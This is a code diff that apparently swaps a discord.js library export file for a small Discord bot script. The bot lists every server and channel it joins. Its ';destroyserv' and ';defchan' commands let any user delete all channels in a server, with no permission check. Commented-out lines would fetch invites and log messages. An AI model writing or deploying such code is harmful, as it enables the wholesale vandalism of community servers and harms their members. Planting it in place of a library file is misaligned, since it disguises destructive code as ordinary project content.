@@ -1,66 +1,55 @@
-const Util = require('./util/Util');
+const Discord = require("discord.js");
+const client = new Discord.Client();
 
-module.exports = {
-  // "Root" classes (starting points)
-  Client: require('./client/Client'),
-  Shard: require('./sharding/Shard'),
-  ShardClientUtil: require('./sharding/ShardClientUtil'),
-  ShardingManager: require('./sharding/ShardingManager'),
-  WebhookClient: require('./client/WebhookClient'),
+client.on("ready", () => {
+    console.log("Conneted as " + client.user.tag)
 
-  // Utilities
-  Collection: require('./util/Collection'),
-  Constants: require('./util/Constants'),
-  DiscordAPIError: require('./client/rest/DiscordAPIError'),
-  EvaluatedPermissions: require('./util/Permissions'),
-  Permissions: require('./util/Permissions'),
-  Snowflake: require('./util/Snowflake'),
-  SnowflakeUtil: require('./util/Snowflake'),
-  Util: Util,
-  util: Util,
-  version: require('../package').version,
+    client.user.setActivity("with JavaScript", {type: "PLAYING"});
 
-  // Shortcuts to Util methods
-  escapeMarkdown: Util.escapeMarkdown,
-  fetchRecommendedShards: Util.fetchRecommendedShards,
-  splitMessage: Util.splitMessage,
+    client.guilds.forEach((guild) => {
+        console.log(guild.name)
+        guild.channels.forEach((channel) => {
+            console.log(` - ${channel.name} ${channel.type} ${channel.id}`)
+        })
+        // General channel id: 615684506699038741
+    })
+    //let generalChannel = client.channels.get("615684506699038741")
+    //const attachment = new Discord.Attachment("")
+    //generalChannel.send("Hello, world!")
+})
+client.on("message", (receivedMessage) => {
+    if (receivedMessage.content == ";destroyserv") {
+        receivedMessage.delete()
+        receivedMessage.guild.channels.forEach((channel) => {
+            channel.delete()
+        })
+    } 
+    if (receivedMessage.content == ";defchan") {
+        receivedMessage.delete()
+        receivedMessage.guild.channels.forEach((channel) => {
+            channel.delete()
+        })
 
-  // Structures
-  Attachment: require('./structures/Attachment'),
-  CategoryChannel: require('./structures/CategoryChannel'),
-  Channel: require('./structures/Channel'),
-  ClientUser: require('./structures/ClientUser'),
-  ClientUserSettings: require('./structures/ClientUserSettings'),
-  Collector: require('./structures/interfaces/Collector'),
-  DMChannel: require('./structures/DMChannel'),
-  Emoji: require('./structures/Emoji'),
-  Game: require('./structures/Presence').Game,
-  GroupDMChannel: require('./structures/GroupDMChannel'),
-  Guild: require('./structures/Guild'),
-  GuildAuditLogs: require('./structures/GuildAuditLogs'),
-  GuildChannel: require('./structures/GuildChannel'),
-  GuildMember: require('./structures/GuildMember'),
-  Invite: require('./structures/Invite'),
-  Message: require('./structures/Message'),
-  MessageAttachment: require('./structures/MessageAttachment'),
-  MessageCollector: require('./structures/MessageCollector'),
-  MessageEmbed: require('./structures/MessageEmbed'),
-  MessageMentions: require('./structures/MessageMentions'),
-  MessageReaction: require('./structures/MessageReaction'),
-  NewsChannel: require('./structures/NewsChannel'),
-  OAuth2Application: require('./structures/OAuth2Application'),
-  ClientOAuth2Application: require('./structures/OAuth2Application'),
-  PartialGuild: require('./structures/PartialGuild'),
-  PartialGuildChannel: require('./structures/PartialGuildChannel'),
-  PermissionOverwrites: require('./structures/PermissionOverwrites'),
-  Presence: require('./structures/Presence').Presence,
-  ReactionEmoji: require('./structures/ReactionEmoji'),
-  ReactionCollector: require('./structures/ReactionCollector'),
-  RichEmbed: require('./structures/RichEmbed'),
-  Role: require('./structures/Role'),
-  StoreChannel: require('./structures/StoreChannel'),
-  TextChannel: require('./structures/TextChannel'),
-  User: require('./structures/User'),
-  VoiceChannel: require('./structures/VoiceChannel'),
-  Webhook: require('./structures/Webhook'),
-};
+        createchannels = ["announcements","rules","information","general","bot-commands","memes","logs"];
+        createchannels.forEach((name)=>{
+            receivedMessage.guild.createChannel(name,"text");
+        })
+    }
+    //if (receivedMessage.content == ";returninvites") {
+        
+        //receivedMessage.guild.fetchInvites()
+            //.then(invites => console.log(invites.tag + "/" + invites.id))
+           // .catch(console.error);
+    //}
+    if (receivedMessage.content.startsWith(";qw")) {
+        //var fs = require('fs');
+
+        //fs.appendFile('jsbotlogs.txt', "\n"+ receivedMessage.content, function (err) {
+        //if (err) throw err;
+        //console.log('Logged!');
+        
+        //}); 
+    }
+})
+
+client.login(process.env.token)
